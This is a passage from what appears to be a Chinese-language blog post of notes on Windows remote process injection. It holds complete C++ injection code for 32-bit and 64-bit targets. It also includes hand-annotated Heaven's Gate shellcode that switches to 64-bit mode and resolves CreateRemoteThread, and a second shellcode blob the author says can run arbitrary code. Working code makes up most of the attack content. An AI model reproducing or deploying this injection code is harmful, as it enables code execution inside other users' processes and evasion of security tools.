CloseHandle(hToken);\n        return false;\n    }\n    tkp.PrivilegeCount = 1;\n    tkp.Privileges[0].Luid = sedebugnameValue;\n    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) {\n        CloseHandle(hToken);\n        return false;\n    }\n    return true;\n}\nHANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)\n{\n    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    PROCESSENTRY32 pe;\n    pe.dwSize = sizeof(PROCESSENTRY32);\n    if (!Process32First(hSnapshot, &amp;pe)) {\n        MessageBoxA(NULL,\n            &quot;The frist entry of the process list has not been copyied to the buffer&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n    while (Process32Next(hSnapshot, &amp;pe)) {\n        if (!lstrcmpW(lpszProcessName, pe.szExeFile)) {\n            return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);\n        }\n    }\n    return 0;\n}\nLPVOID init_func(char* asmcode, DWORD len)\n{\n    LPVOID sc = NULL;\n    // allocate write/executable memory for code\n    sc = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n    if (sc != NULL) {\n        // copy code\n        memcpy(sc, asmcode, len);\n    }\n    else {\n        MessageBoxA(NULL, &quot;VirtualAlloc()&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n    }\n    return sc;\n}\nint main()\n{\n    const DWORD dwThreadSize = 4096;\n    DWORD dwWriteBytes = 0;\n    enableDebugPriv();\n    HANDLE TargetProc = GetProcessHandleByName(L&quot;CCC.exe&quot;);//进程名称\n    if (!TargetProc)\n    {\n        MessageBoxA(NULL,\n            &quot;Open target process failed !&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n\n    BOOL ISWow64 = false;\n    IsWow64Process(TargetProc, &amp;ISWow64);\n\n    if (ISWow64)\n    {\n        cout &lt;&lt; &quot;32Bit Process &quot; &lt;&lt;endl;\n        //在宿主进程中为线程体开辟一块存储区域  \n        //在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  \n        //其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  \n        void* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n            dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        if (!pRemoteThread) {\n            MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,\n                &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n\n        //将线程体拷贝到宿主进程中  \n        if (!WriteProcessMemory(TargetProc,\n            pRemoteThread, &amp;threadProc, dwThreadSize, 0)) {\n            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,\n                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        cout &lt;&lt; &quot;pRemoteThread:&quot; &lt;&lt; hex &lt;&lt; pRemoteThread &lt;&lt; endl;\n        getchar();\n        //定义线程参数结构体变量  \n        RemoteParam remoteData;\n        ZeroMemory(&amp;remoteData, sizeof(RemoteParam));\n\n        //填充结构体变量中的成员  \n        HINSTANCE hUser32 = LoadLibrary(L&quot;User32.dll&quot;);\n        remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;);\n        strcat_s(remoteData.szMsg, &quot;Hello＼0&quot;);\n\n        //为线程参数在宿主进程中开辟存储区域  \n        RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(\n            TargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);\n\n        if (!pRemoteParam) {\n            MessageBoxA(NULL, &quot;Alloc memory failed !&quot;,\n                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        //将线程参数拷贝到宿主进程地址空间中  \n        if (!WriteProcessMemory(TargetProc,\n            pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) {\n            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,\n                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n\n        //在宿主进程中创建线程  \n        HANDLE hRemoteThread = CreateRemoteThread(\n            TargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,\n            pRemoteParam, 0, &amp;dwWriteBytes);\n        if (!hRemoteThread) {\n            MessageBoxA(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        CloseHandle(hRemoteThread);\n        FreeLibrary(hUser32);\n        return 0;\n\n    }\n    else\n    {\n\n        cout &lt;&lt; &quot;64Bit Process &quot; &lt;&lt; endl;\n        void* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n            EXECPIC_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        if (!pRemoteThread) {\n            MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,\n                &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        if (!WriteProcessMemory(TargetProc, pRemoteThread, EXECPIC, EXECPIC_SIZE, 0))\n        {\n            MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,\n                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        HANDLE hThread = NULL;\n        pCreateRemoteThread64 CreateRemoteThread64 = (pCreateRemoteThread64)init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE);\n        CreateRemoteThread64(TargetProc, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteThread, 0, 0, 0, &amp;hThread);\n        if (!hThread)\n        {\n            MessageBoxA(NULL, &quot;CreateRemoteThread64 target thread failed !&quot;,\n                &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n            return 0;\n        }\n        WaitForSingleObject(hThread, INFINITE);\n    }\n    return 0;\n}</code></pre>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"远进程注入\"><a href=\"#远进程注入\" class=\"headerlink\" title=\"远进程注入\"></a>远进程注入</h2><p><a href=\"https://www.cnblogs.com/uAreKongqi/p/6012353.html\" target=\"_blank\" rel=\"noopener\">注入参考——必看</a></p>\n<h3 id=\"32位-gt-32位\"><a href=\"#32位-gt-32位\" class=\"headerlink\" title=\"32位-&gt;32位\"></a>32位-&gt;32位</h3><p>核心思路如下</p>\n<ul>\n<li>根据进程ID打开进程，获得进程句柄</li>\n<li>申请内存空间</li>\n<li>写入数据</li>\n<li>将内存改为可读可执行(可选)</li>\n<li>创建线程</li>\n<li>等待线程退出(可选)</li>\n</ul>\n<p><strong>使用到的API</strong></p>\n<ul>\n<li>OpenProcess</li>\n<li>VirtualAllocEx</li>\n<li>WriteProcessMemory</li>\n<li>VirtualProtectEx</li>\n<li>CreateRemoteThread</li>\n<li>WaitForSingleObject</li>\n</ul>\n<p>注入模板网上都有。这里贴一下注入函数且带有参数的写法</p>\n<pre><code class=\"c++\">#pragma once  \n#include &lt;windows.h&gt;  \n#include &lt;TlHelp32.h&gt;  \n#include &quot;stdio.h&quot;\n\ntypedef struct _RemoteParam {\n    char szMsg[12];    //MessageBox函数中显示的字符提示  \n    DWORD dwMessageBox;//MessageBox函数的入口地址  \n} RemoteParam, * PRemoteParam;\n\n//定义MessageBox类型的函数指针  \ntypedef int(__stdcall* PFN_MESSAGEBOX)(HWND, LPCSTR, LPCSTR, DWORD);\n\nDWORD __stdcall threadProc(LPVOID lParam)\n{\n    RemoteParam* pRP = (RemoteParam*)lParam;\n    PFN_MESSAGEBOX pfnMessageBox;\n    pfnMessageBox = (PFN_MESSAGEBOX)pRP-&gt;dwMessageBox;\n    pfnMessageBox(NULL, pRP-&gt;szMsg, pRP-&gt;szMsg, 0);\n    return 0;\n}\n\nbool enableDebugPriv()\n{\n    HANDLE hToken;\n    LUID sedebugnameValue;\n    TOKEN_PRIVILEGES tkp;\n    if (!OpenProcessToken(GetCurrentProcess(),\n        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) {\n        return false;\n    }\n    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;sedebugnameValue)) {\n        CloseHandle(hToken);\n        return false;\n    }\n    tkp.PrivilegeCount = 1;\n    tkp.Privileges[0].Luid = sedebugnameValue;\n    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tkp, sizeof(tkp), NULL, NULL)) {\n        CloseHandle(hToken);\n        return false;\n    }\n    return true;\n}\n\nHANDLE GetProcessHandleByName(LPCWSTR lpszProcessName)\n{\n    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n    PROCESSENTRY32 pe;\n    pe.dwSize = sizeof(PROCESSENTRY32);\n    if (!Process32First(hSnapshot, &amp;pe)) {\n        MessageBoxA(NULL,\n            &quot;The frist entry of the process list has not been copyied to the buffer&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n    while (Process32Next(hSnapshot, &amp;pe)) {\n        if (!lstrcmpW(lpszProcessName, pe.szExeFile)) {\n            return OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);\n        }\n    }\n    return 0;\n}\n\nint _main()\n{\n    const DWORD dwThreadSize = 4096;\n    DWORD dwWriteBytes = 0;\n    enableDebugPriv();\n    HANDLE TargetProc = GetProcessHandleByName(L&quot;CheckVm.exe&quot;);\n    if (!TargetProc)\n    {\n        MessageBoxA(NULL,\n            &quot;Open target process failed !&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n\n    //在宿主进程中为线程体开辟一块存储区域  \n    //在这里需要注意MEM_COMMIT | MEM_RESERVE内存非配类型以及PAGE_EXECUTE_READWRITE内存保护类型  \n    //其具体含义请参考MSDN中关于VirtualAllocEx函数的说明。  \n    void* pRemoteThread = VirtualAllocEx(TargetProc, 0,\n        dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    if (!pRemoteThread) {\n        MessageBoxA(NULL, &quot;Alloc memory in target process failed !&quot;,\n            &quot;notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n\n    //将线程体拷贝到宿主进程中  \n    if (!WriteProcessMemory(TargetProc,\n        pRemoteThread, &amp;threadProc, dwThreadSize, 0)) {\n        MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n    //定义线程参数结构体变量  \n    RemoteParam remoteData;\n    ZeroMemory(&amp;remoteData, sizeof(RemoteParam));\n\n    //填充结构体变量中的成员  \n    HINSTANCE hUser32 = LoadLibrary(L&quot;User32.dll&quot;);\n    remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, &quot;MessageBoxA&quot;);\n    strcat_s(remoteData.szMsg, &quot;Hello＼0&quot;);\n\n    //为线程参数在宿主进程中开辟存储区域  \n    RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(\n        TargetProc, 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);\n\n    if (!pRemoteParam) {\n        MessageBoxA(NULL, &quot;Alloc memory failed !&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n    //将线程参数拷贝到宿主进程地址空间中  \n    if (!WriteProcessMemory(TargetProc,\n        pRemoteParam, &amp;remoteData, sizeof(remoteData), 0)) {\n        MessageBoxA(NULL, &quot;Write data to target process failed !&quot;,\n            &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n\n    //在宿主进程中创建线程  \n    HANDLE hRemoteThread = CreateRemoteThread(\n        TargetProc, NULL, 0, (DWORD(__stdcall*)(void*))pRemoteThread,\n        pRemoteParam, 0, &amp;dwWriteBytes);\n    if (!hRemoteThread) {\n        MessageBoxA(NULL, &quot;Create remote thread failed !&quot;, &quot;Notice&quot;, MB_ICONINFORMATION | MB_OK);\n        return 0;\n    }\n    CloseHandle(hRemoteThread);\n    FreeLibrary(hUser32);\n    return 0;\n}</code></pre>\n<h3 id=\"32位-gt-64位\"><a href=\"#32位-gt-64位\" class=\"headerlink\" title=\"32位-&gt;64位\"></a>32位-&gt;64位</h3><p>核心思路如下</p>\n<ul>\n<li>根据进程ID打开进程，获得进程句柄</li>\n<li>申请内存空间</li>\n<li>写入数据</li>\n<li>将内存改为可读可执行(可选)</li>\n<li>创建线程</li>\n<li>等待线程退出(可选)</li>\n</ul>\n<p><strong>使用到的API</strong></p>\n<ul>\n<li>OpenProcess</li>\n<li>VirtualAllocEx</li>\n<li>WriteProcessMemory</li>\n<li>VirtualProtectEx</li>\n<li><strong>CreateRemoteThread64</strong></li>\n<li>WaitForSingleObject</li>\n</ul>\n<p>32位去注入64位进程时<code>CreateRemoteThread</code>会调用失败，需要使用64位的接口</p>\n<p>先提升到64位汇编，在遍历ntdll.dll中的导出函数 <code>CreateRemoteThread</code></p>\n<h2 id=\"笔记\"><a href=\"#笔记\" class=\"headerlink\" title=\"笔记\"></a>笔记</h2><p><a href=\"https://www.cnblogs.com/HsinTsao/p/7270732.html\" target=\"_blank\" rel=\"noopener\">32位注入64位参考</a></p>\n<p>3g大佬代码代码有点问题，有点误导</p>\n<p>获取64位代码是32位的汇编，他写的64位的结果，实则是通过遍历ntdll64里面的64位API 实现的</p>\n<blockquote>\n<p> 在x64系统下的进程是有32位和64位两种工作模式，这两种工作模式的区别在于CS寄存器。32位模式时，<strong>CS = 0x23</strong>；64位模式时，<strong>CS = 0x33</strong>。</p>\n<p>这两种工作模式是可以进行切换的，一般会通过retf指令，一条retf指令等效于以下2条汇编指令</p>\n<p><code>pop ip</code></p>\n<p><code>pop cs</code></p>\n</blockquote>\n<p>代码中<code>CREATETHREADPIC</code>shellcode是用来得到64位的<code>CreateRemoteThread</code></p>\n<p><code>EXECPIC</code>是我通过vs生成的谈拆管理shellcode，可疑调整为任意代码</p>\n<pre><code class=\"c++\">#pragma once  \n#include &lt;windows.h&gt;  \n#include &lt;TlHelp32.h&gt;  \n#include &lt;iostream&gt;\nusing namespace std;\n\n#define CREATETHREADPIC_SIZE 271\nchar CREATETHREADPIC[] = {\n    /* 0000 */ &quot;\\x53&quot;                             /* push ebx                    */\n    /* 0001 */ &quot;\\x56&quot;                             /* push esi                    */\n    /* 0002 */ &quot;\\x57&quot;                             /* push edi                    */\n    /* 0003 */ &quot;\\x55&quot;                             /* push ebp                    */\n    /* 0004 */ &quot;\\xe8\\x6c\\x00\\x00\\x00&quot;             /* call 0x75                   */\n    /* 0009 */ &quot;\\x85\\xc0&quot;                         /* test eax, eax               */\n    /* 000B */ &quot;\\x74\\x5d&quot;                         /* jz 0x6a                     */\n    /* 000D */ &quot;\\x48\\x89\\xe6&quot;                     /* mov rsi, rsp                */\n    /* 0010 */ &quot;\\x48\\x83\\xe4\\xf0&quot;                 /* and rsp, 0xfffffffffffffff0 */\n    /* 0014 */ &quot;\\x48\\x83\\xec\\x68&quot;                 /* sub rsp, 0x68               */\n    /* 0018 */ &quot;\\xb8\\xfa\\x80\\x39\\x5e&quot;             /* mov eax, 0x5e3980fa         */\n    /* 001D */ &quot;\\xe8\\x78\\x00\\x00\\x00&quot;             /* call 0x9a                   */\n    /* 0022 */ &quot;\\x48\\x89\\xc3&quot;                     /* mov rbx, rax                */\n    /* 0025 */ &quot;\\x4d\\x31\\xc0&quot;                     /* xor r8, r8                  */\n    /* 0028 */ &quot;\\x48\\x31\\xc0&quot;                     /* xor rax, rax                */\n    /* 002B */ &quot;\\x48\\x89\\x44\\x24\\x50&quot;             /* mov [rsp+0x50], rax         */\n    /* 0030 */ &quot;\\x48\\x89\\x44\\x24\\x48&quot;             /* mov [rsp+0x48], rax         */\n    /* 0035 */ &quot;\\x48\\x89\\x44\\x24\\x40&quot;             /* mov [rsp+0x40], rax         */\n    /* 003A */ &quot;\\x48\\x89\\x44\\x24\\x38&quot;             /* mov [rsp+0x38], rax         */\n    /* 003F */ &quot;\\x48\\x89\\x44\\x24\\x30&quot;             /* mov [rsp+0x30], rax         */\n    /* 0044 */ &quot;\\x8b\\x46\\x24&quot;                     /* mov eax, [rsi+0x24]         */\n    /* 0047 */ &quot;\\x48\\x89\\x44\\x24\\x28&quot;             /* mov [rsp+0x28], rax         */\n    /* 004C */ &quot;\\x8b\\x46\\x20&quot;                     /* mov eax, [rsi+0x20]         */\n    /* 004F */ &quot;\\x48\\x89\\x44\\x24\\x20&quot;             /* mov [rsp+0x20], rax         */\n    /* 0054 */ &quot;\\x44\\x8b\\x4e\\x14&quot;                 /* mov r9d, [rsi+0x14]         */\n    /* 0058 */ &quot;\\xba\\x00\\x00\\x00\\x10&quot;             /* mov edx, 0x10000000         */\n    /* 005D */ &quot;\\x8b\\x4e\\x30&quot;                     /* mov ecx, [rsi+0x30]         */\n    /* 0060 */ &quot;\\xff\\xd3&quot;                         /* call rbx                    */\n    /* 0062 */ &quot;\\x48\\x89\\xf4&quot;                     /* mov rsp, rsi                */\n    /* 0065 */ &quot;\\xe8\\x18\\x00\\x00\\x00&quot;             /* call 0x82                   */\n    /* 006A */ &quot;\\x5d&quot;                             /* pop rbp                     */\n    /* 006B */ &quot;\\x5f&quot;                             /* pop rdi                     */\n    /* 006C */ &quot;\\x5e&quot;                             /* pop rsi                     */\n    /* 006D */ &quot;\\x5b&quot;                             /* pop rbx                     */\n    /* 006E */ &quot;\\xc3&quot;                             /* ret                         */\n    /* 006F */ &quot;\\x31\\xc0&quot;                         /* xor eax, eax                */\n    /* 0071 */ &quot;\\x48\\xf7\\xd8&quot;                     /* neg eax                     */\n    /* 0074 */ &quot;\\xc3&quot;                             /* ret                         */\n    /* 0075 */ &quot;\\xe8\\xf5\\xff\\xff\\xff&quot;             /* call 0x6f                   */\n    /* 007A */ &quot;\\x74\\x05&quot;                         /* jz 0x81                     */\n    /* 007C */ &quot;\\x58&quot;                             /* pop eax                     */\n    /* 007D */ &quot;\\x6a\\x33&quot;                         /* push 0x33                   */ //将cs修改为0x33\n    /* 007F */ &quot;\\x50&quot;                             /* push eax                    */ //也就能执行64位汇编了\n    /* 0080 */ &quot;\\xcb&quot;                             /* retf                        */\n    /* 0081 */ &quot;\\xc3&quot;                             /* ret                         */\n    /* 0082 */ &quot;\\xe8\\xe8\\xff\\xff\\xff&quot;             /* call 0x6f                   */\n    /* 0087 */ &quot;\\x75\\x10&quot;                         /* jnz 0x99                    */\n    /* 0089 */ &quot;\\x58&quot;                             /* pop rax                     */\n    /* 008A */ &quot;\\x83\\xec\\x08&quot;                     /* sub esp, 0x8                */\n    /* 008D */ &quot;\\x89\\x04\\x24&quot;                     /* mov [rsp], eax              */\n    /* 0090 */ &quot;\\xc7\\x44\\x24\\x04\\x23\\x00\\x00\\x00&quot; /* mov dword [rsp+0x4], 0x23   */\n    /* 0098 */ &quot;\\xcb&quot;                             /* retf                        */\n    /* 0099 */ &quot;\\xc3&quot;                             /* ret                         */\n    /* 009A */ &quot;\\x56&quot;                             /* push rsi                    */\n    /* 009B */ &quot;\\x57&quot;                             /* push rdi                    */\n    /* 009C */ &quot;\\x53&quot;                             /* push rbx                    */\n    /* 009D */ &quot;\\x51&quot;                             /* push rcx                    */\n    /* 009E */ &quot;\\x49\\x89\\xc0&quot;                     /* mov r8, rax                 */\n    /* 00A1 */ &quot;\\x6a\\x60&quot;                         /* push 0x60                   */\n    /* 00A3 */ &quot;\\x5e&quot;                             /* pop rsi                     */\n    /* 00A4 */ &quot;\\x65\\x48\\x8b\\x06&quot;                 /* mov rax, [gs:rsi]           */\n    /* 00A8 */ &quot;\\x48\\x8b\\x40\\x18&quot;                 /* mov rax, [rax+0x18]         */\n    /* 00AC */ &quot;\\x4c\\x8b\\x50\\x30&quot;                 /* mov r10, [rax+0x30]         */\n    /* 00B0 */ &quot;\\x49\\x8b\\x6a\\x10&quot;                 /* mov rbp, [r10+0x10]         */\n    /* 00B4 */ &quot;\\x48\\x85\\xed&quot;                     /* test rbp, rbp               */\n    /* 00B7 */ &quot;\\x89\\xe8&quot;                         /* mov eax, ebp                */\n    /* 00B9 */ &quot;\\x74\\x4f&quot;                         /* jz 0x10a                    */\n    /* 00BB */ &quot;\\x4d\\x8b\\x12&quot;                     /* mov r10, [r10]              */\n    /* 00BE */ &quot;\\x8b\\x45\\x3c&quot;                     /* mov eax, [rbp+0x3c]         */\n    /* 00C1 */ &quot;\\x83\\xc0\\x10&quot;                     /* add eax, 0x10               */\n    /* 00C4 */ &quot;\\x8b\\x44\\x05\\x78&quot;                 /* mov eax, [rbp+rax+0x78]     */\n    /* 00C8 */ &quot;\\x48\\x8d\\x74\\x05\\x18&quot;             /* lea rsi, [rbp+rax+0x18]     */\n    /* 00CD */ &quot;\\xad&quot;                             /* lodsd                       */\n    /* 00CE */ &quot;\\x91&quot;                             /* xchg ecx, eax               */\n    /* 00CF */ &quot;\\x67\\xe3\\xde&quot;                     /* jecxz 0xb0                  */\n    /* 00D2 */ &quot;\\xad&quot;                             /* lodsd                       */\n    /* 00D3 */ &quot;\\x4c\\x8d\\x5c\\x05\\x00&quot;             /* lea r11, [rbp+rax]          */\n    /* 00D8 */ &quot;\\xad&quot;                             /* lodsd                       */\n    /* 00D9 */ &quot;\\x48\\x8d\\x7c\\x05\\x00&quot;             /* lea rdi, [rbp+rax]          */\n    /* 00DE */ &quot;\\xad&quot;                             /* lodsd                       */\n    /* 00DF */ &quot;\\x48\\x8d\\x5c\\x05\\x00&quot;             /* lea rbx, [rbp+rax]          */\n    /* 00E4 */ &quot;\\x8b\\x74\\x8f\\xfc&quot;                 /* mov esi, [rdi+rcx*4-0x4]    */\n    /* 00E8 */ &quot;\\x48\\x01\\xee&quot;                     /* add rsi, rbp                */\n    /* 00EB */ &quot;\\x31\\xc0&quot;                         /* xor eax, eax                */\n    /* 00ED */ &quot;\\x99&quot;                             /* cdq                         */\n    /* 00EE */ &quot;\\xac&quot;                             /* lodsb                       */\n    /* 00EF */ &quot;\\x01\\xc2&quot;                         /* add edx, eax                */\n    /* 00F1 */ &quot;\\xc1\\xc2\\x05&quot;                     /* rol edx, 0x5                */\n    /* 00F4 */ &quot;\\xff\\xc8&quot;                         /* dec eax                     */\n    /* 00F6 */ &quot;\\x79\\xf6&quot;                         /* jns 0xee                    */\n    /* 00F8 */ &quot;\\x44\\x39\\xc2&quot;                     /* cmp edx, r8d                */\n    /* 00FB */ &quot;\\xe0\\xe7&quot;                         /* loopne 0xe4                 */\n    /* 00FD */ &quot;\\x75\\xb1&quot;                         /* jnz 0xb0                    */\n    /* 00FF */ &quot;\\x0f\\xb7\\x14\\x4b&quot;                 /* movzx edx, word [rbx+rcx*2] */\n    /* 0103 */ &quot;\\x41\\x8b\\x04\\x93&quot;                 /* mov eax, [r11+rdx*4]        */\n    /* 0107 */ &quot;\\x48\\x01\\xe8&quot;                     /* add rax, rbp                */\n    /* 010A */ &quot;\\x59&quot;                             /* pop rcx                     */\n    /* 010B */ &quot;\\x5b&quot;                             /* pop rbx                     */\n    /* 010C */ &quot;\\x5f&quot;                             /* pop rdi                     */\n    /* 010D */ &quot;\\x5e&quot;                             /* pop rsi                     */\n    /* 010E */ &quot;\\xc3&quot;                             /* ret                         */\n};\n#define EXECPIC_SIZE 1984\nchar EXECPIC[] = {\n    /* 0000 */ &quot;\\x48\\x81\\xec\\xd8\\x00\\x00\\x00&quot;                     /* sub rsp, 0xd8                            */\n    /* 0007 */ &quot;\\x48\\xc7\\x44\\x24\\x78\\x00\\x00\\x00\\x00&quot;             /* mov qword [rsp+0x78], 0x0                */\n    /* 0010 */ &quot;\\x48\\xc7\\x84\\x24\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; /* mov qword [rsp+0x80], 0x0                */\n    /* 001C */ &quot;\\x48\\xc7\\x84\\x24\\xa8\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; /* mov qword [rsp+0xa8], 0x0                */\n    /* 0028 */ &quot;\\xb8\\x75\\x00\\x00\\x00&quot;                             /* mov eax, 0x75                            */\n    /* 002D */ &quot;\\x66\\x89\\x44\\x24\\x58&quot;                             /* mov [rsp+0x58], ax                       */\n    /* 0032 */ &quot;\\xb8\\x73\\x00\\x00\\x00&quot;                             /* mov eax, 0x73                            */\n    /* 0037 */ &quot;\\x66\\x89\\x44\\x24\\x5a&quot;                             /* mov [rsp+0x5a], ax                       */\n    /* 003C */ &quot;\\xb8\\x65\\x00\\x00\\x00&quot;                             /* mov eax, 0x65                            */\n    /* 0041 */ &quot;\\x66\\x89\\x44\\x24\\x5c&quot;                             /* mov [rsp+0x5c], ax                       */\n    /* 0046 */ &quot;\\xb8\\x72\\x00\\x00\\x00&quot;                             /* mov eax, 0x72                            */\n    /* 004B */ &quot;\\x66\\x89\\x44\\x24\\x5e&quot;                             /* mov [rsp+0x5e], ax                       */\n    /* 0050 */ &quot;\\xb8\\x33\\x00\\x00\\x00&quot;                             /* mov eax, 0x33                            */\n    /* 0055 */ &quot;\\x66\\x89\\x44\\x24\\x60&quot;                             /* mov [rsp+0x60], ax                       */\n    /* 005A */ &quot;\\xb8\\x32\\x00\\x00\\x00&quot;                             /* mov eax, 0x32                            */\n    /* 005F */ &quot;\\x66\\x89\\x44\\x24\\x62&quot;                             /* mov [rsp+0x62], ax                       */\n    /* 0064 */ &quot;\\xb8\\x2e\\x00\\x00\\x00&quot;                             /* mov eax, 0x2e                            */\n    /* 0069 */ &quot;\\x66\\x89\\x44\\x24\\x64&quot;                             /* mov [rsp+0x64], ax                       */\n    /* 006E */ &quot;\\xb8\\x64\\x00\\x00\\x00&quot;                             /* mov eax, 0x64                            */\n    /* 0073 */ &quot;\\x66\\x89\\x44\\x24\\x66&quot;                             /* mov [rsp+0x66], ax                       */\n    /* 0078 */ &quot;\\xb8\\x6c\\x00\\x00\\x00&quot;                             /* mov eax, 0x6c                            */\n    /* 007D */ &quot;\\x66\\x89\\x44\\x24\\x68&quot;                             /* mov [rsp+0x68], ax                       */\n    /* 0082 */ &quot;\\xb8\\x6c\\x00\\x00\\x00&quot;                             /* mov eax, 0x6c                            */\n    /* 0087 */ &quot;\\x66\\x89\\x44\\x24\\x6a&quot;                             /* mov [rsp+0x6a], ax                       */\n    /* 008C */ &quot;\\x33\\xc0&quot;                                         /* xor eax, eax                             */\n    /* 008E */ &quot;\\x66\\x89\\x44\\x24\\x6c&quot;                             /* mov [rsp+0x6c], ax                       */\n    /* 0093 */ &quot;\\xc6\\x44\\x24\\x30\\x4d&quot;                             /* mov byte [rsp+0x30], 0x4d                */\n    /* 0098 */ &quot;\\xc6\\x44\\x24\\x31\\x65&quot;                             /* mov byte [rsp+0x31], 0x65                */\n    /* 009D */ &quot;\\xc6\\x44\\x24\\x32\\x73&quot;                             /* mov byte [rsp+0x32], 0x73                */\n    /* 00A2 */ &quot;\\xc6\\x44\\x24\\x33\\x73&quot;                             /* mov byte [rsp+0x33], 0x73                */\n    /* 00A7 */ &quot;\\xc6\\x44\\x24\\x34\\x61&quot;                             /* mov byte [rsp+0x34], 0x61                */\n    /* 00AC */ &quot;\\xc6\\x44\\x24\\x35\\x67&quot;                             /* mov byte [rsp+0x35], 0x67                */\n    /* 00B1 */ &quot;\\xc6\\x44\\x24\\x36\\x65&quot;                             /* mov byte [rsp+0x36], 0x65                */\n    /* 00B6 */ &quot;\\xc6\\x44\\x24\\x37\\x42&quot;                             /* mov byte [rsp+0x37], 0x42                */\n    /* 00BB */ &quot;\\xc6\\x44\\x24\\x38\\x6f&quot;                             /* mov byte [rsp+0x38], 0x6f                */\n    /* 00C0 */ &quot;\\xc6\\x44\\x24\\x39\\x78&quot;                             /* mov byte [rsp+0x39], 0x78                */\n    /* 00C5 */ &quot;\\xc6\\x44\\x24\\x3a\\x41&quot;                             /* mov byte [rsp+0x3a], 0x41                */\n    /* 00CA */ &quot;\\xc6\\x44\\x24\\x3b\\x00&quot;                             /* mov byte [rsp+0x3b], 0x0                 */\n    /* 00CF */ &quot;\\xc6\\x44\\x24\\x40\\x48&quot;                             /* mov byte [rsp+0x40], 0x48                */\n    /* 00D4 */ &quot;\\xc6\\x44\\x24\\x41\\x65&quot;                             /* mov byte [rsp+0x41], 0x65                */\n    /* 00D9 */ &quot;\\xc6\\x44\\x24\\x42\\x6c&quot;                             /* mov byte [rsp+0x42], 0x6c                */\n    /* 00DE */ &quot;\\xc6\\x44\\x24\\x43\\x6c&quot;                             /* mov byte [rsp+0x43], 0x6c                */\n    /* 00E3 */ &quot;\\xc6\\x44\\x24\\x44\\x6f&quot;                             /* mov byte [rsp+0x44], 0x6f                */\n    /* 00E8 */ &quot;\\xc6\\x44\\x24\\x45\\x2e&quot;                             /* mov byte [rsp+0x45], 0x2e                */\n    /* 00ED */ &quot;\\xc6\\x44\\x24\\x46\\x57&quot;                             /* mov byte [rsp+0x46], 0x57                */\n    /* 00F2 */ &quot;\\xc6\\x44\\x24\\x47\\x6f&quot;                             /* mov byte [rsp+0x47], 0x6f                */\n    /* 00F7 */ &quot;\\xc6\\x44\\x24\\x48\\x6c&quot;                             /* mov byte [rsp+0x48], 0x6c                */\n    /* 00FC */ &quot;\\xc6\\x44\\x24\\x49\\x72&quot;                             /* mov byte [rsp+0x49], 0x72                */\n    /* 0101 */ &quot;\\xc6\\x44\\x24\\x4a\\x64&quot;                             /* mov byte [rsp+0x4a], 0x64                */\n 